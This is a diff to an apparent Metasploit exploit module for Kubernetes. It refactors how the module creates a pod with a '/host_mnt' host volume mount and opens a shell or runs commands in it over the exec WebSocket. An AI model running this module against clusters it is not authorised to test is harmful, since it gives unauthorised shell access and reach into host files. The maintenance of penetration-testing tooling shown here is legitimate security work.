+++ modules/exploits/multi/kubernetes/exec.rb
@@ -27,7 +27,6 @@ class MetasploitModule < Msf::Exploit
           'Spencer McIntyre'
         ],
         'References' => [
-          # ['URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']
         ],
         'Notes' => {
           'SideEffects' => [
@@ -90,7 +89,7 @@ class MetasploitModule < Msf::Exploit
             }
           ]
         ],
-        'DisclosureDate' => '2000-01-01', # FIXME: find an actual disclosure date
+        'DisclosureDate' => '2021-10-01',
         'DefaultTarget' => 0,
         'Platform' => [ 'linux', 'unix' ],
         'SessionTypes' => [ 'meterpreter' ]
@@ -108,10 +107,6 @@ class MetasploitModule < Msf::Exploit
         OptString.new('SHELL', [true, 'The shell to use for execution', 'sh' ]),
       ]
     )
-  end
-
-  def check
-    # For the check command
   end
 
   def api_token
@@ -212,7 +207,7 @@ class MetasploitModule < Msf::Exploit
           {
             name: random_identifiers[:container_name],
             image: image_name,
-            command: %w[/bin/tail -f /dev/null],
+            command: ['/bin/sh', '-c', 'exec tail -f /dev/null'],
             volumeMounts: [
               {
                 mountPath: '/host_mnt',
@@ -237,7 +232,7 @@ class MetasploitModule < Msf::Exploit
       host: rhost,
       port: rport,
       data: {
-        pod: Hash[%i[name namespace uid creationTimestamp].map { |field| [field, result.dig(:metadata, field)] }]
+        pod: result[:metadata].slice(:name, :namespace, :uid, :creationTimestamp)
       },
       update: :unique_data
     )
@@ -271,9 +266,18 @@ class MetasploitModule < Msf::Exploit
     case target['Type']
     when :nix_stream
       # Setting tty => true allows the shell prompt to be seen but it also causes commands to be echoed back
-      websocket = @kubernetes_client.exec_pod(pod_name, datastore['Namespace'], datastore['Shell'], 'stdin' => true)
+      websocket = @kubernetes_client.exec_pod(
+        pod_name,
+        datastore['Namespace'],
+        datastore['Shell'],
+        'stdin' => true,
+        'stdout' => true,
+        'stderr' => true,
+        'tty' => false
+      )
       fail_with(Failure::Unknown, 'Failed to establish the WebSocket') if websocket.nil?
 
+      print_good('Successfully established the WebSocket')
       channel = Msf::Exploit::Remote::HTTP::Kubernetes::Client::ExecChannel.new(websocket)
       handler(channel.lsock)
     when :nix_cmd
@@ -300,7 +304,15 @@ class MetasploitModule < Msf::Exploit
       command = [datastore['Shell'], '-c', cmd]
     end
 
-    result = @kubernetes_client.exec_pod_capture(pod_name, datastore['Namespace'], command) do |stdout, stderr|
+    result = @kubernetes_client.exec_pod_capture(
+      pod_name,
+      datastore['Namespace'],
+      command,
+      'stdin' => false,
+      'stdout' => true,
+      'stderr' => true,
+      'tty' => false
+    ) do |stdout, stderr|
       print_line(stdout.strip) unless stdout.blank?
       print_line(stderr.strip) unless stderr.blank?
     end
